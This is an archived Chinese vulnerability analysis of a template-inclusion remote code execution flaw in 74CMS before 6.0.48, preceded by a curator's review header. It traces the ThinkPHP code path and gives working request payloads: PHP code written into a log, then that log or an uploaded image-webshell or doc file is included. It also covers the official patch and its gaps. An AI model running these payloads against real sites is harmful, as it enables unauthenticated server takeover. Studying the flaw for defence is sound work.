---
source: "MrWQ/vulnerability-paper"
product: "74CMS骑士CMS<6.0.48"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "骑士 CMS 模板包含漏洞分析"
prerequisites: "来源所述条件，未列明部分仍待核：publicassign_resume_tpl viahome;existingcontrollablelog/image/doc; registeredaccountforresumeupload;Thinkengine/templatecachewritable"
side_effects: "未执行；本文需注意的操作影响：保留且前置补丁边界：原文指出 is_file 加删除日志路径只能阻断日志写法，已上传图片/doc 的包含分支仍可能存在；不能由一个补丁或 <6.0.48 概括所有变体已修复。；注册实验注释短信校验属于改动环境；图片/doc 上传分支仍需真实账号与上传权限，日志分支前提须单列。最终 include 的是编译缓存，不是简单直接包含原上传文件；THEME_PATH 分支须结合 content 是否为空解释。"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/7ZUMjN8xyaGUF-ZTh-7Csg"
id: "vw-6bdf6517560cebf3c2dd7a86"
entity_id: "ve-6bdf6517560cebf3c2dd7a86"
schema_version: "1"
---

## 核对与使用边界

- 保留且前置补丁边界：原文指出 is_file 加删除日志路径只能阻断日志写法，已上传图片/doc 的包含分支仍可能存在；不能由一个补丁或 <6.0.48 概括所有变体已修复。
- 注册实验注释短信校验属于改动环境；图片/doc 上传分支仍需真实账号与上传权限，日志分支前提须单列。最终 include 的是编译缓存，不是简单直接包含原上传文件；THEME_PATH 分支须结合 content 是否为空解释。
- GET/POST、日志转义与模板大小写的差异保留为待核实验差异，不能只因同漏洞将这份独立补丁分析吞并。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：publicassign_resume_tpl viahome;existingcontrollablelog/image/doc; registeredaccountforresumeupload;Thinkengine/templatecachewritable

- **事实待核（1）**：清楚指出官方is_file+删日志路径补丁只挡日志写法、不挡已上传图片/doc包含，这个不完全修复证据必须保留而非统称&lt;6.0.48已全修。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **实验改动边界（2）**：注册实验直接注释短信验证码，是改动环境；图片/doc分支仍需真实可注册账号/上传权限，日志分支才无需登录。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **适用与权限边界（3）**：把最终include称上传原文件不精确，实际包含编译缓存；THEME_PATH赋值分支解释与源码content为空条件有错置。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **代码与转录边界（4）**：日志payload/r/n和qsCMS大小写/中文属性需核真实模板语法；GET与754POST必要说法不同要保留实测差异。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（5）**：完整调用链有价值，缺官方精确补丁commit/最终安全版本；与694/754/755同漏洞不同深度不直接去重。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 骑士 CMS 模板包含漏洞分析

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7ZUMjN8xyaGUF-ZTh-7Csg)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6s0gib9Yq2dPlIuE5CuO65ialicEm5rnO0ZlkUZavkSrbNSm0Tz3V9NNA3WLiarOvCicTuEDbCiaich9Pow/640?wx_fmt=png)

  

00

简介

骑士 CMS 人才系统，是一项基于 PHP+MYSQL 为核心开发的一套免费开源专业人才网站系统。

  

01

漏洞概述

骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。

  

02

影响版本

骑士 CMS < 6.0.48

  

03

漏洞分析

漏洞入口点为：\Application\Common\Controller\BaseController.class.php 中的 assign_resume_tpl 方法

```
/**
  * 渲染简历模板
  */
public function assign_resume_tpl($variable,$tpl){
    foreach ($variable as $key => $value) {
        $this->assign($key,$value);
    }
    return $this->fetch($tpl);
}

```

此函数可控 (但其传参方式不是通过 ThinkPHP 的 m,c,a 进行直接传参，后续漏洞复现板块将介绍)。现在，暂时先跟进传入的 $tpl 参数会进入的 fetch( ) 方法

```
public function fetch($templateFile='',$content='',$prefix='') {
        if(empty($content)) {
            $templateFile   =   $this->parseTemplate($templateFile);
            // 模板文件不存在直接返回
            if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        }else{
            defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
        }
        // 页面缓存
        ob_start();
        ob_implicit_flush(0);
        if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板
            $_content   =   $content;
            // 模板阵列变量分解成为独立变量
            extract($this->tVar, EXTR_OVERWRITE);
            // 直接载入PHP模板
            empty($_content)?include $templateFile:eval('?>'.$_content);
        }else{
            // 视图解析标签
            $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
            Hook::listen('view_parse',$params);
        }
        // 获取并清空缓存
        $content = ob_get_clean();
        // 内容过滤标签
        Hook::listen('view_filter',$content);
        // 输出模板文件
        return $content;
    }

```

首先判断传入的文件是否为空 因为我们是直接传参，无 content 内容 接着他便会解析当前路径是否存在，不存在则进行 exception(此处会暴露当前的路径信息)，存在则将此路径赋给’THEME_PATH’配置信息

```
if(empty($content)) {
    $templateFile   =   $this->parseTemplate($templateFile);
    // 模板文件不存在直接返回
    if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
}else{
    defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
}

```

由于 74CMS 使用的 ThinkPHP 框架，其默认的模板类型为 Think 所以我们进入判断，并继续进入 Hook::listen(‘view_parse’,$params)，其实际上是个执行相应插件并记录日志的函数

```
foreach (self::$tags[$tag] as $name) {
                APP_DEBUG && G($name.'_start');
                $result =   self::exec($name, $tag,$params);
                if(APP_DEBUG){
                    G($name.'_end');
                    trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');
                }
                if(false === $result) {
                    // 如果返回false 则中断插件执行
                    return ;
                }
            }

```

这里继续说一下 exec 会通过判断插件名是否以 Behavior 结尾，来决定是否调用其 run 方法

```
static public function exec($name, $tag,&$params=NULL) {
        if('Behavior' == substr($name,-8) ){
            // 行为扩展必须用run入口方法
            $tag    =   'run';
        }
        $addon   = new $name();
        return $addon->$tag($params);
    }

```

在 \ThinkPHP\Mode\common.php 文件中我们可以看到 view_parse 对应的值实际为 Behavior\ParseTemplateBehavior 所以我们继续跟进其 run 方法

```
public function run(&$_data){
        $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
        $_content           =   empty($_data['content'])?$_data['file']:$_data['content'];
        $_data['prefix']    =   !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX');
        if('think'==$engine){ // 采用Think模板引擎
            if((!empty($_data['content']) 
                &&  $this->checkContentCache($_data['content'],$_data['prefix'])) 
                ||  $this->checkCache($_data['file'],$_data['prefix'])) // 缓存有效
            { //载入模版缓存文件                     
              Storage::load(C('CACHE_PATH').$_data['prefix']
                                  .md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']);
            }else{
                $tpl = Think::instance('Think\\Template');
                // 编译并加载模板文件
                $tpl->fetch($_content,$_data['var'],$_data['prefix']);
            }

```

可以看到他实际上是个解析模板并输出的方法，因为我们第一次访问的时候不会有缓存存在所以只需要关注 $tpl->fetch

```
public function fetch($templateFile,$templateVar,$prefix='') {
        $this->tVar         =   $templateVar;
        $templateCacheFile  =   $this->loadTemplate($templateFile,$prefix);
        Storage::load($templateCacheFile,$this->tVar,null,'tpl');
    }

```

在此处经过 loadTemplate 对需要访问的文件进行一定的安全处理后就会进入我们的重头戏

```
public function loadTemplate ($templateFile,$prefix='') {
        if(is_file($templateFile)) {
            $this->templateFile    =  $templateFile;
            // 读取模板文件内容
            $tmplContent =  file_get_contents($templateFile);
        }else{
            $tmplContent =  $templateFile;
        }
        //省略部分代码
        }
        // 编译模板内容
        $tmplContent =  $this->compiler($tmplContent);
        Storage::put($tmplCacheFile,trim($tmplContent),'tpl');
        return $tmplCacheFile;
    }
protected function compiler($tmplContent) {
        //模板解析
        $tmplContent =  $this->parse($tmplContent);
        // 还原被替换的Literal标签
        $tmplContent =  preg_replace_callback('/<!--###literal(\d+)###-->/is', array($this, 'restoreLiteral'), $tmplContent);
        // 添加安全代码
        $tmplContent =  '<?php if (!defined(\'THINK_PATH\')) exit();?>'.$tmplContent;
        // 优化生成的php代码
        $tmplContent = str_replace('?><?php','',$tmplContent);
        // 模版编译过滤标签
        Hook::listen('template_filter',$tmplContent);
        return strip_whitespace($tmplContent);
    }

```

在这里我们需要额外关注一下 $tmplContent = $this->parse($tmplContent) 这块会对模板的标签进行解析，如果解析失败会无法显示正常页面，所以我们传入的文件必须包含规范的标签

接着就会走进我们的 Storage::load 的逻辑，查看 Storage 的类方法 load。注意，此处是个静态方法调用

```
class Storage {

    /**
     * 操作句柄
     * @var string
     * @access protected
     */
    static protected $handler    ;

    /**
     * 连接分布式文件系统
     * @access public
     * @param string $type 文件类型
     * @param array $options  配置数组
     * @return void
     */
    static public function connect($type='File',$options=array()) {
        $class  =   'Think\\Storage\\Driver\\'.ucwords($type);
        self::$handler = new $class($options);
    }

    static public function __callstatic($method,$args){
        //调用缓存驱动的方法
        if(method_exists(self::$handler, $method)){
           return call_user_func_array(array(self::$handler,$method), $args);
        }
    }
}

```

我们实际上会调用到 ThinkPHP\Library\Think\Storage\Driver\File.class.php 中的 load 方法

```
public function load($_filename,$vars=null){
        if(!is_null($vars)){
            extract($vars, EXTR_OVERWRITE);
        }
        include $_filename;
    }

```

可以看到此处直接用 include 包含了我们上传的文件

  

04

漏洞复现

由上述分析可知，我们只需向 assign_resume_tpl 中的 tpl 参数传入我们现存的文件路径，74CMS 经过安全处理后就会对其进行文件包含。

具体复现漏洞所需条件：

1.  上传包含需要执行的命令和模板标签的文件
    
2.  获取文件的位置
    
3.  精心构造 Payload 去包含相应文件
    

### **1. 通过日志包含**

我们都知道 74CMS 的日志默认保存位置为 data/Runtime/Logs/Home/Y_M_D.log

那么我们可以通过先让日志中产生我们想执行的 php 代码 + 模板标签，后通过请求去包含相关日志文件

#### step1 通过非法请求产生日志

当我们直接用 ThinkPHP 框架的传参方法 m=common&c=base&a=assign_resume_tpl&variable=1&tpl=1 会发现 common 模块是不可访问的，而当传递 m=home&a=assign_resume_tpl 时经过反射调用最终会调用到我们想要调用的方法。

```
74cms.net/index.php?m=home&a=assign_resume_tpl&variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qsCMS/company_show 列表名="info"企业id="$_GET['id']"/> 

```

Ps：后半部分合法的模板标签可以在 /Application/Home/View/tpl_company/default/com_jobs_list.html 中看到

接着我们可以看到后台已经产生了相应的日志文件

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6s0gib9Yq2dPlIuE5CuO65iacliaLN0OnPbIib3csV2SMAGUoqqXqJcCLDHkpSHiaiaOTg9mA1gsXQgic0g/640?wx_fmt=png)

#### step2 通过非法请求包含日志

我们将日志文件的路径传入 tpl 参数，即可让页面包含此文件执行我们想要执行的代码

```
74cms.net/index.php?m=home&a=assign_resume_tpl&variable=1&tpl=./data/Runtime/Logs/Home/21_01_20.log

```

执行成功！

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6s0gib9Yq2dPlIuE5CuO65iaKQKMmZvvibm95XYhRIMRgcJzR4R1okp4pOnHK9YMJrQTbUjZKlZGs5Q/640?wx_fmt=png)

### **2. 通过图片简历上传包**

#### step1 账号注册

在简历更新板块可以上传图片且获取其上传路径，但是需要我们先注册一个账号

如果是在本地虚拟环境搭建 74CMS 系统，会发现因为 api 校验不通过而无法获取手机验证码注册，但可以通过注释 Application\Common\Common\function.php 的 verify_mobile 中的代码取消验证码验证

```
function verify_mobile($mobile,$smsVerify,$vcode_sms){
//    if(!$vcode_sms) return '请输入验证码！';
//    $verify_num = session('_verify_num_check');
//    if($verify_num >= C('VERIFY_NUM_CHECK')) return '非法操作！';
//    if(!fieldRegex($mobile, 'mobile')) return '手机号格式错误！';
//    if(!$smsVerify) return '短信验证码错误！';
//    if($mobile != $smsVerify['mobile']) return '手机号不一致！';
//    if(time() > $smsVerify['time'] + 600) return '短信验证码已过期！';
//    $mobile_rand = substr(md5($vcode_sms), 8, 16);
//    if($mobile_rand != $smsVerify['rand']){
//        session('_verify_num_check',++$verify_num);
//        return '短信验证码错误！';
//    }
//    session('_verify_num_check',null);
    return true;
}

```

#### step2 构造图片马并上传

注册完成账号之后就可以在简历界面上传自己构造的图片马，需要注意的是图片马也需要包含上文中的模板标签

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6s0gib9Yq2dPlIuE5CuO65iaXVeRdsS7ezUkFxPs1ltsNErduTdDkRZnYsNVOsuyiajzPRArUTA1Yfg/640?wx_fmt=png)

#### step3 构造请求访问此文件

构造上文类似的 Payload 去包含此文件即可执行恶意代码

```
74cms.net/index.php?m=home&a=assign_resume_tpl&variable=1&tpl=./data/upload/resume_img/2101/21/6008e8636d20e.png

```

### **3. 通过文档简历上传**

与方法 2 中的图片马一样，只是此处需要上传的是 doc 文件

  

05

漏洞修复

官方发布的补丁程序有两处

#### 1.BaseController

在 /Application/Common/Controller/BaseController.class.php 中的 assign_resume_tpl 增添了如下判断

```
public function assign_resume_tpl($variable,$tpl){
    foreach ($variable as $key => $value) {
        $this->assign($key,$value);
    }
    if(!is_file($tpl)){
        return false;
    }
    return $this->fetch($tpl);
}

```

#### 2.Think/View

在 /ThinkPHP/Library/Think/View 中的 fetch 删除了对访问路径的日志和回显

```
if(empty($content)) {
    $templateFile   =   $this->parseTemplate($templateFile);
    // 模板文件不存在直接返回
    // if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
    if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'));
}else{
    defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());
}

```

但其实补丁程序的这两处对于图片和文档的包含上传是没有影响的

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
